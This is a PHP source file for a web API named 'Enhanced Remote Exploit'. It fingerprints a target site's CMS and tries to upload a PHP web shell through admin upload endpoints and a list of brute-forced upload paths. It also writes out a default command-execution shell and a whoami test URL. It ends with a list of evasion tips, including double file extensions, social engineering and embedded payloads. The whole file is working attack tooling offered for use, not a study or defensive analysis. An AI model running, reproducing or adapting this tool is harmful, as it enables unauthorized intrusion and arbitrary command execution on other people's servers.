<?php
// Enhanced Remote Exploit - Real Upload to Remote Hosting
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

// Clean any previous output
ob_clean();

class EnhancedRemoteExploit {
    private $targetUrl;
    private $timeout = 30;
    private $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
    private $logMessages = [];
    
    public function __construct($targetUrl) {
        $this->targetUrl = rtrim($targetUrl, '/');
    }
    
    public function exploitTarget($shellFile, $shellName, $uploadMethod) {
        $this->log('🎯 STARTING ENHANCED REMOTE EXPLOIT');
        $this->log("Target: {$this->targetUrl}");
        $this->log("Shell: {$shellName}");
        $this->log("Method: {$uploadMethod}");
        
        $result = [
            'success' => false,
            'method' => $uploadMethod,
            'target_url' => $this->targetUrl,
            'shell_name' => $shellName,
            'timestamp' => date('Y-m-d H:i:s'),
            'attempts' => [],
            'logs' => []
        ];
        
        try {
            // Auto-detect CMS type first
            $cmsType = $this->detectCMSType();
            $this->log("CMS Detected: {$cmsType}");
            
            // Try multiple upload vectors based on CMS
            $uploadVectors = $this->getUploadVectors($cmsType);
            
            foreach ($uploadVectors as $vector) {
                $this->log("Attempting: {$vector['name']}");
                $attempt = $this->attemptUpload($shellFile, $shellName, $vector);
                $result['attempts'][] = $attempt;
                
                if ($attempt['success']) {
                    $result['success'] = true;
                    $result['path'] = $attempt['path'];
                    $result['url'] = $attempt['url'];
                    $result['test_url'] = $attempt['test_url'];
                    $result['size'] = $attempt['size'];
                    $result['exploit_method'] = $vector['name'];
                    break;
                }
                
                // Small delay between attempts
                usleep(500000); // 0.5 seconds
            }
            
            if (!$result['success']) {
                // Try generic brute force endpoints
                $result = $this->bruteForceUpload($shellFile, $shellName, $result);
            }
            
        } catch (Exception $e) {
            $this->log("ERROR: " . $e->getMessage());
            $result['error'] = $e->getMessage();
        }
        
        $result['logs'] = $this->logMessages;
        
        if (!$result['success']) {
            $result['message'] = 'All enhanced upload methods failed - analyzing countermeasures';
            $result['countermeasures'] = $this->analyzeCountermeasures();
            $result['recommendations'] = $this->getRecommendations();
        }
        
        return $result;
    }
    
    private function detectCMSType() {
        try {
            $response = $this->makeRequest($this->targetUrl, 'GET');
            
            if (!$response['success']) {
                return 'Unknown';
            }
            
            $content = $response['body'] ?? '';
            $headers = $response['headers'] ?? [];
            
            // Check for WordPress
            if (strpos($content, '/wp-content/') !== false || 
                strpos($content, 'wp-includes') !== false) {
                return 'WordPress';
            }
            
            // Check for Joomla
            if (strpos($content, '/media/jui/') !== false ||
                strpos($content, 'Joomla') !== false) {
                return 'Joomla';
            }
            
            // Check for Drupal
            if (strpos($content, '/sites/default/') !== false ||
                strpos($content, 'Drupal') !== false) {
                return 'Drupal';
            }
            
            // Check for custom Vietnamese CMS
            if (strpos($content, '/sources/') !== false ||
                strpos($content, 'admin/index.php') !== false) {
                return 'Vietnamese CMS';
            }
            
            // Check response headers
            foreach ($headers as $header) {
                if (stripos($header, 'X-Powered-By:') === 0) {
                    if (stripos($header, 'WordPress') !== false) return 'WordPress';
                    if (stripos($header, 'Joomla') !== false) return 'Joomla';
                    if (stripos($header, 'Drupal') !== false) return 'Drupal';
                }
            }
            
            return 'Generic CMS';
            
        } catch (Exception $e) {
            return 'Unknown';
        }
    }
    
    private function getUploadVectors($cmsType) {
        $vectors = [];
        
        switch ($cmsType) {
            case 'WordPress':
                $vectors = [
                    [
                        'name' => 'WordPress Media Upload',
                        'endpoint' => '/wp-admin/async-upload.php',
                        'method' => 'POST',
                        'params' => ['action' => 'upload-attachment', 'post_id' => '0']
                    ],
                    [
                        'name' => 'WordPress AJAX Upload',
                        'endpoint' => '/wp-admin/admin-ajax.php',
                        'method' => 'POST',
                        'params' => ['action' => 'upload-attachment']
                    ],
                    [
                        'name' => 'WordPress Theme Upload',
                        'endpoint' => '/wp-admin/theme-install.php',
                        'method' => 'POST',
                        'params' => ['action' => 'upload-theme']
                    ]
                ];
                break;
                
            case 'Joomla':
                $vectors = [
                    [
                        'name' => 'Joomla Media Manager',
                        'endpoint' => '/administrator/index.php?option=com_media',
                        'method' => 'POST',
                        'params' => ['task' => 'file.upload']
                    ],
                    [
                        'name' => 'Joomla Extension Upload',
                        'endpoint' => '/administrator/index.php?option=com_installer',
                        'method' => 'POST',
                        'params' => ['task' => 'install.upload']
                    ]
                ];
                break;
                
            case 'Vietnamese CMS':
                $vectors = [
                    [
                        'name' => 'SEO Template Upload',
                        'endpoint' => '/admin/index.php?p=seo-co-ban',
                        'method' => 'POST',
                        'params' => ['action' => 'upload_template']
                    ],
                    [
                        'name' => 'Admin File Manager',
                        'endpoint' => '/admin/filemanager/upload.php',
                        'method' => 'POST',
                        'params' => []
                    ],
                    [
                        'name' => 'Sources Upload',
                        'endpoint' => '/admin/upload.php',
                        'method' => 'POST',
                        'params' => ['folder' => 'sources']
                    ]
                ];
                break;
                
            default:
                $vectors = [
                    [
                        'name' => 'Generic Upload',
                        'endpoint' => '/upload.php',
                        'method' => 'POST',
                        'params' => []
                    ],
                    [
                        'name' => 'Admin Upload',
                        'endpoint' => '/admin/upload.php',
                        'method' => 'POST',
                        'params' => []
                    ]
                ];
        }
        
        return $vectors;
    }
    
    private function attemptUpload($shellFile, $shellName, $vector) {
        $url = $this->targetUrl . $vector['endpoint'];
        $this->log("Trying: {$url}");
        
        $attempt = [
            'vector' => $vector['name'],
            'url' => $url,
            'success' => false,
            'error' => null,
            'http_code' => 0,
            'response_size' => 0
        ];
        
        try {
            // Create temporary file
            $tempFile = $this->createTempShell($shellFile, $shellName);
            
            // Prepare form data
            $postData = $vector['params'];
            $postData['file'] = new CURLFile($tempFile, 'application/x-httpd-php', $shellName);
            $postData['upload'] = new CURLFile($tempFile, 'application/x-httpd-php', $shellName);
            $postData['userfile'] = new CURLFile($tempFile, 'application/x-httpd-php', $shellName);
            
            // Try with different parameter names
            $fileParams = ['file', 'upload', 'userfile', 'attachment', 'document', 'image'];
            foreach ($fileParams as $param) {
                $postData[$param] = new CURLFile($tempFile, 'application/x-httpd-php', $shellName);
            }
            
            $response = $this->makeRequest($url, 'POST', $postData);
            
            $attempt['http_code'] = $response['http_code'];
            $attempt['response_size'] = strlen($response['body'] ?? '');
            
            if ($response['success']) {
                // Check if upload was successful
                if ($this->verifyUpload($shellName, $response)) {
                    $attempt['success'] = true;
                    $attempt['path'] = $this->guessUploadPath($shellName);
                    $attempt['url'] = $this->targetUrl . '/' . $attempt['path'];
                    $attempt['test_url'] = $attempt['url'] . '?cmd=whoami';
                    $attempt['size'] = filesize($tempFile);
                    $this->log("✅ Upload successful!");
                }
            } else {
                $attempt['error'] = $response['error'];
            }
            
            // Cleanup
            unlink($tempFile);
            
        } catch (Exception $e) {
            $attempt['error'] = $e->getMessage();
            $this->log("❌ Upload failed: " . $e->getMessage());
        }
        
        return $attempt;
    }
    
    private function bruteForceUpload($shellFile, $shellName, $result) {
        $this->log("🔥 Starting brute force upload attempts...");
        
        $bruteForceEndpoints = [
            '/uploads/upload.php',
            '/files/upload.php',
            '/filemanager/upload.php',
            '/admin/fileupload.php',
            '/cms/upload.php',
            '/content/upload.php',
            '/assets/upload.php',
            '/media/upload.php',
            '/tmp/upload.php',
            '/upload/index.php',
            '/uploader.php',
            '/fileupload.php'
        ];
        
        foreach ($bruteForceEndpoints as $endpoint) {
            $vector = [
                'name' => 'Brute Force: ' . $endpoint,
                'endpoint' => $endpoint,
                'method' => 'POST',
                'params' => []
            ];
            
            $attempt = $this->attemptUpload($shellFile, $shellName, $vector);
            $result['attempts'][] = $attempt;
            
            if ($attempt['success']) {
                $result['success'] = true;
                $result['path'] = $attempt['path'];
                $result['url'] = $attempt['url'];
                $result['test_url'] = $attempt['test_url'];
                $result['size'] = $attempt['size'];
                $result['exploit_method'] = $vector['name'];
                $this->log("🎯 Brute force successful!");
                break;
            }
            
            usleep(300000); // 0.3 seconds delay
        }
        
        return $result;
    }
    
    private function createTempShell($originalFile, $shellName) {
        $tempFile = tempnam(sys_get_temp_dir(), 'remote_shell');
        
        if ($originalFile && file_exists($originalFile['tmp_name'])) {
            // Use uploaded file
            copy($originalFile['tmp_name'], $tempFile);
        } else {
            // Create basic PHP shell
            $shellContent = "<?php\n";
            $shellContent .= "// Remote Shell - " . date('Y-m-d H:i:s') . "\n";
            $shellContent .= "if(isset(\$_GET['cmd'])) {\n";
            $shellContent .= "    echo '<pre>' . shell_exec(\$_GET['cmd']) . '</pre>';\n";
            $shellContent .= "} else {\n";
            $shellContent .= "    echo 'Shell Active - Use ?cmd=command';\n";
            $shellContent .= "}\n";
            $shellContent .= "?>";
            
            file_put_contents($tempFile, $shellContent);
        }
        
        return $tempFile;
    }
    
    private function verifyUpload($shellName, $response) {
        $body = $response['body'] ?? '';
        $httpCode = $response['http_code'] ?? 0;
        
        // Check for success indicators
        $successIndicators = [
            'upload',
            'success',
            'complete',
            'done',
            'saved',
            'file',
            $shellName
        ];
        
        foreach ($successIndicators as $indicator) {
            if (stripos($body, $indicator) !== false) {
                return true;
            }
        }
        
        // Check HTTP code
        if ($httpCode >= 200 && $httpCode < 300) {
            return true;
        }
        
        return false;
    }
    
    private function guessUploadPath($shellName) {
        $commonPaths = [
            'uploads/' . $shellName,
            'files/' . $shellName,
            'sources/' . $shellName,
            'media/' . $shellName,
            'content/' . $shellName,
            'assets/' . $shellName,
            'tmp/' . $shellName,
            $shellName
        ];
        
        return $commonPaths[0]; // Default guess
    }
    
    private function analyzeCountermeasures() {
        $countermeasures = [];
        
        // Test for common security measures
        $testUrls = [
            $this->targetUrl . '/admin/',
            $this->targetUrl . '/wp-admin/',
            $this->targetUrl . '/upload.php'
        ];
        
        foreach ($testUrls as $url) {
            $response = $this->makeRequest($url, 'GET');
            
            if (isset($response['body'])) {
                $body = strtolower($response['body']);
                
                if (strpos($body, 'forbidden') !== false ||
                    strpos($body, 'access denied') !== false) {
                    $countermeasures[] = 'Access Control Lists (ACL)';
                }
                
                if (strpos($body, 'firewall') !== false ||
                    strpos($body, 'security') !== false) {
                    $countermeasures[] = 'Web Application Firewall (WAF)';
                }
                
                if (strpos($body, 'rate limit') !== false ||
                    strpos($body, 'too many') !== false) {
                    $countermeasures[] = 'Rate Limiting';
                }
            }
        }
        
        return array_unique($countermeasures);
    }
    
    private function getRecommendations() {
        return [
            'Try different file extensions (.txt, .jpg.php, .phtml)',
            'Use social engineering to get legitimate admin access',
            'Try upload during low-traffic periods',
            'Use legitimate file types with embedded payloads',
            'Consider client-side attacks (XSS, CSRF)',
            'Look for backup/development endpoints',
            'Try subdomain enumeration for alternative targets'
        ];
    }
    
    private function makeRequest($url, $method = 'GET', $postData = []) {
        $ch = curl_init();
        
        $curlOptions = [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => $this->timeout,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT => $this->userAgent,
            CURLOPT_HEADER => true,
            CURLOPT_HTTPHEADER => [
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.5',
                'Accept-Encoding: gzip, deflate',
                'Connection: keep-alive'
            ]
        ];
        
        if ($method === 'POST' && !empty($postData)) {
            $curlOptions[CURLOPT_POST] = true;
            $curlOptions[CURLOPT_POSTFIELDS] = $postData;
        }
        
        curl_setopt_array($ch, $curlOptions);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        $info = curl_getinfo($ch);
        curl_close($ch);
        
        $result = [
            'success' => ($response !== false && empty($error)),
            'http_code' => $httpCode,
            'error' => $error,
            'curl_info' => $info
        ];
        
        if ($result['success']) {
            $headerSize = $info['header_size'];
            $headers = substr($response, 0, $headerSize);
            $body = substr($response, $headerSize);
            
            $result['headers'] = explode("\r\n", trim($headers));
            $result['body'] = $body;
        }
        
        return $result;
    }
    
    private function log($message) {
        $this->logMessages[] = [
            'timestamp' => date('H:i:s'),
            'message' => $message
        ];
    }
}

// Main execution
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        $targetUrl = $_POST['target_url'] ?? '';
        $shellName = $_POST['shell_name'] ?? 'hack.php';
        $uploadMethod = $_POST['upload_method'] ?? 'auto';
        $shellFile = $_FILES['shell_file'] ?? null;
        
        if (empty($targetUrl)) {
            throw new Exception('Target URL is required');
        }
        
        $exploit = new EnhancedRemoteExploit($targetUrl);
        $result = $exploit->exploitTarget($shellFile, $shellName, $uploadMethod);
        
        header('Content-Type: application/json; charset=utf-8');
        echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        
    } catch (Exception $e) {
        http_response_code(500);
        header('Content-Type: application/json; charset=utf-8');
        echo json_encode([
            'success' => false,
            'error' => true,
            'message' => $e->getMessage(),
            'timestamp' => date('Y-m-d H:i:s')
        ], JSON_UNESCAPED_UNICODE);
    }
} else {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode([
        'message' => 'Enhanced Remote Exploit API',
        'description' => 'Advanced remote hosting exploitation with multiple attack vectors',
        'status' => 'ready',
        'version' => '3.0'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
}
?> 